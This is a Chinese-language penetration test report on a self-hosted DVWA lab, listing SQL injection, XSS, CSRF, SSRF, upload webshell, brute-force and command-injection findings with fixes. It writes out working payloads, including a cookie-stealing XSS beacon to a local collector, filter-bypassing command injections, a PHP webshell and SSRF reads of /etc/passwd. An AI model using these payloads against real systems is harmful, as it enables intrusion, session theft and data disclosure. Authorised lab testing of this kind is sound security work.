# DVWA 渗透测试报告

> 目标：http://127.0.0.1:8612（本地自建 DVWA 靶栈，实验 12）· 方式：手工利用 +
> 自研工具（本系列实验 13-18）· 授权：全部为自建靶场，仅本机环回访问。
> 本报告只记录**实际复现过**的结果；未覆盖的项目明确标注「未测」。

## 1. 执行摘要

对 DVWA 的 6 类问题进行了全流程复现：**3 类可直达命令执行**（文件上传、
命令注入，以及 XSS→会话窃取链）、**1 类可拖走全量凭据**（SQL 注入）、
**1 类可借位访问内网与本地文件**（SSRF）、**1 类可跨站改写账号密码**
（CSRF），另有**弱口令爆破与一处会话安全缺陷**（登录不轮换 ID=会话固定面），
并发现一处环境缺陷（PHP/DB 时区不一致曾使锁定失效，已修复）。

逐档实测结论：DVWA 的 low 档几乎全线失守；medium 档的「黑名单/自报
类型/referer」均为声明式校验，各有稳定绕过；high 档明显变强（SQLi 未测、
上传与命令注入仍需组合绕过）；impossible 档仅在爆破模块实测，防护有效
（token + 限速 + 锁定齐全）。各等级的判定**均以实验 13-18 的实际输出为准**。

## 2. 测试范围与方法

- 范围：DVWA 全部 Web 漏洞模块 + 1 个自建 SSRF 靶服务（:8602）。
- 方法：手工构造最小验证 + 自研脚本对账（sqlmap 交叉验证、自写检测器、
  多线程爆破器、payload 速查表）；每项均给出「复现步骤 → 证据 → 影响 →
  修复」。
- 约定：等级标注格式为「档位：结果（手法）」；「未测」= 本系列未覆盖。

## 3. 漏洞详情

### 3.1 SQL 注入（SQL Injection）

**位置**：`/vulnerabilities/sqli/`、`/vulnerabilities/sqli_blind/`（参数 `id`）。

**等级实测**（依据：实验 13）：
- low：可注入（GET）；union 一次拖出 users 表全部 5 个账号与口令哈希。
- medium：可注入（**表单改为 POST 提交**——检测脚本需按档切换方法）。
- high / impossible：未测。

**复现步骤**：`ORDER BY` 定列数（2 列）→ 报错信号为**空响应** →
`UNION SELECT 1,2` 找显位 → 拖库；盲注用二分法提取 `database()`（= dvwa，
0.2 秒）；时间信道 `SLEEP(1.5)` 实测延迟 1.5 秒；自研五点检测器 5/5 判定
正确（含 1 个必须判安全的对照点）；`sqlmap --dump` 与手工结果逐字一致。

**证据**：`admin 5f4dcc3b5aa765d61d8327deb882cf99` 等 5 行账号哈希（与
sqlmap 输出逐字相同）；参数化查询对照实验中，同样的注入串作为**纯数据**
返回空结果。

**影响与评级**：**高危**——全库数据泄露（含可离线爆破的 MD5 哈希），且
证明查询可被任意改写。

**修复建议**：全面改用参数化查询（预编译）；数据库账号最小权限；错误
信息收敛（不显示 SQL 异常）。

### 3.2 跨站脚本（XSS）

**位置**：`/vulnerabilities/xss_r/`（反射）、`/vulnerabilities/xss_s/`（存储）、
`/vulnerabilities/xss_d/`（DOM）。

**等级实测**（依据：实验 14）：
- low：三种类型全部触发——headless 受害浏览器 4 次访问带回 4 条窃取回调
  （每条都含会话 cookie）。
- medium：反射型用 `<Script>` 大小写绕过成功（`str_replace` 只删小写）；
  存储型表单 `maxlength` 只是前端属性，脚本直接提交 101 字符越过。
- high / impossible：未测。

**复现步骤**：payload 为 `new Image().src='http://127.0.0.1:8600/steal?c='+
encodeURIComponent(document.cookie)`；存储型投毒后任何访客访问留言板即
中招；DOM 型把参数的 encodeURI 式编码经页面 JS 的 `decodeURI` 还原执行。

**证据**：接收端 4 条回调、含 `PHPSESSID` 与 `security` 档位值。

**影响与评级**：**高危**——会话窃取、钓鱼篡改、存储型的蠕虫式传播面。

**修复建议**：按输出上下文做转义（HTML/属性/JS 各不相同）；会话 cookie
加 HttpOnly；部署 CSP 限制内联脚本与外连。

### 3.3 CSRF 与 SSRF

**位置（CSRF）**：`/vulnerabilities/csrf/`（改密端点）。

**等级实测**（依据：实验 15）：
- low：跨站改密成功——本地另一端口（:8601）的攻击页自动提交表单，
  受害者浏览器一访问密码即被改走（新密码可登录，随后还原）。
- medium：referer 检查拦截（本栈 `SERVER_NAME` 为绑定地址 `0.0.0.0`
  的怪癖）——但可用 `referrer-policy: unsafe-url` 把要检查的子串织进
  攻击页 URL 路径，绕过成功。
- high：`user_token` 机制生效——无 token 的跨站表单改不动密码。

**复现步骤**：攻击页 = 隐藏表单 + 自动提交（GET）；绕过变体加
`<meta name="referrer" content="unsafe-url">` 且路径含 `0.0.0.0`。

**证据**：三次 `[check] 尝试登录（密码 hosec15-pwned）` 分别为成功 /
失败 / 成功（绕过），high 档失败。

**位置（SSRF）**：**自建靶服务**（:8602，实验 15）——DVWA 本体无 SSRF
模块，此处演练「服务器代取 URL」类漏洞。

**复现步骤**：请求 `/fetch?url=http://127.0.0.1:PORT/` 探测端口，按响应
形态判定（HTTP 内容 / 协议握手垃圾 / 连接拒绝）；`file:///etc/passwd`
直接读文件。

**证据**：3306 判定 open（响应含 MySQL 握手包特征
`ERROR: BadStatusLine("J\x00\x00\x00\x0a")`）；`/etc/passwd` 前 1200 字节
（`root:*:0:0:...`）。

**影响与评级**：CSRF **中危**（需诱导访问 + 目标仅 cookie 鉴权）；
SSRF **高危**（内网侦察 + 本地任意读，云环境可直达元数据凭证）。

**修复建议**：CSRF——每会话随机 user_token + Origin 校验 + 敏感操作
二次认证；SSRF——协议与地址白名单、禁内网与元数据地址、禁重定向跨
白名单。

### 3.4 文件上传与 Webshell

**位置**：`/vulnerabilities/upload/`。

**等级实测**（依据：实验 16）：
- low：无校验——一句话木马 `shell.php` 直接落地，
  `curl shell.php?cmd=whoami` 返回 `root`。
- medium：只查客户端自报的 MIME——伪造 `Content-Type: image/jpeg` 即过
  （双扩展名 `shell.php.jpg` 同样被接受——它不看扩展名）。
- high：负对照成立（纯 php 被拒）；GIF 图片马（合法 1x1 GIF + php 尾巴）
  以 jpg 扩展名过检，**配合文件包含** `?page=../../hackable/uploads/
  shell.jpg&cmd=whoami` 执行成功（返回 root）。
- impossible：未测（维持尝试的档位止于 high）。

**证据**：三档利用的命令回显均为 `root`（容器 Web 进程权限）。

**影响与评级**：**严重**——直接获得服务器远控（webshell）。

**修复建议**：扩展名白名单 + 服务端重编码图片（剥掉夹带）；落地改随机
名；上传目录禁止脚本解析；多重校验并行。

### 3.5 暴力破解与会话安全

**位置**：`/vulnerabilities/brute/`（登录表单）与靶站登录会话。

**等级实测**（依据：实验 17）：
- low：自研多线程爆破器 100 条字典 **0.4 秒**命中（第 87 条为预设口令）。
- medium / high：未单独实测（成本账推算：sleep(2) 把单线程字典拉到 200
  秒起步；token 每轮强制读页面）。
- impossible：token + `sleep(2-4)` + 锁定三层齐全——连试 5 条全部失败，
  其中**第 4 条是正确口令仍被拒**（3 次失败后锁 15 分钟）。
- 会话安全：登录前后 `PHPSESSID` **未轮换**（会话固定面）；另实测发现
  PHP 与数据库时区不一致会让锁定计时失效（本栈已对齐修复）。

**复现步骤**：`brute_lab.py brute --level low --dict dict-100.txt`；
impossible 用 5 条字典（第 4 条为正确口令）；会话检查比对登录前后 ID。

**证据**：命中行 `字典第 87 条 → gordonb/abc123（耗时 0.4 秒）`；
impossible `5 条全部失败`；`[sess] 登录前后 PHPSESSID：未轮换`。

**影响与评级**：**中危**——弱口令下账号可被快速破解；会话固定需要攻击者
具备「先向受害者植入会话 ID」的前置能力。

**修复建议**：全局限速 + 账号/来源双维度锁定 + MFA；登录成功时重新生成
会话 ID（一行修复）；登录结果统一响应。

### 3.6 命令注入（Command Injection）

**位置**：`/vulnerabilities/exec/`（参数 `ip`，Windows 拼 `ping`/*nix 拼
`ping -c 4`）。

**等级实测**（依据：实验 18）：
- low：无过滤——`127.0.0.1; whoami` → `root`；`127.0.0.1 | id` → `uid=0`。
- medium：黑名单删 `&&` 与 `;`——分号负例成立（无回显）；`| whoami`
  绕过成功；`127.0.0.1|cat${IFS}/etc/passwd` 用 `${IFS}` 当空格读文件。
- high：黑名单再删 `||`、`&`、`;`、`|␣`（管道+空格）、`-`、`$`、`(`、
  `)`、反引号——带空格管道负例成立；**`|whoami` 管道变体（后不加空格）
  绕过成功**，回显 `root`。
- impossible：采用四段数字白名单校验，未测但源码判定不可注入。

**证据**：三档命令回显（`root` / `uid=0(root)...`）与两次负例的
「空响应」（命令未拼上）。

**影响与评级**：**严重**——以 Web 进程身份（本容器为 root）任意执行系统
命令。

**修复建议**：不拼接 shell 命令——输入严格白名单（IPv4 格式校验）+
必须拼时使用 `escapeshellarg` 参数化；Web 进程最小权限运行。

## 4. 风险评级汇总

| 漏洞 | 评级 | 实测依据（关键证据） | 优先级 |
|:---|:---|:---|:---|
| 命令注入 | 严重 | low/medium/high 三档均获 RCE（root） | P0 |
| 文件上传 | 严重 | low 直传即执行；high 组合绕过成功 | P0 |
| SQL 注入 | 高危 | union 拖出全部 5 个账号哈希 | P1 |
| XSS | 高危 | 三型触发、4 条会话 cookie 窃取回调 | P1 |
| SSRF（自建靶） | 高危 | 3306 端口探测 + /etc/passwd 读取 | P1 |
| CSRF | 中危 | low 跨站改密成功；medium 可绕过；high 有 token | P2 |
| 暴力破解 / 会话安全 | 中危 | low 档 0.4 秒爆破；会话 ID 未轮换 | P2 |

## 5. 修复优先级与建议

1. **P0（先堵 RCE 面）**：上传白名单+重编码+目录禁解析；命令注入改白名单
   校验与参数化调用；Web 进程降权（非 root）。
2. **P1（数据与跨站面）**：SQL 全参数化；输出编码 + HttpOnly + CSP；SSRF
   协议/地址白名单。
3. **P2（凭据与会话）**：爆破限速+锁定+MFA；登录轮换会话 ID；敏感操作
   加 user_token 与 Origin 校验。
4. **通用**：本报告只覆盖单点利用；持续防护要接上检测层——实验 19-21
   的日志审计与 IDS 规则正是为上述流量建立的告警。
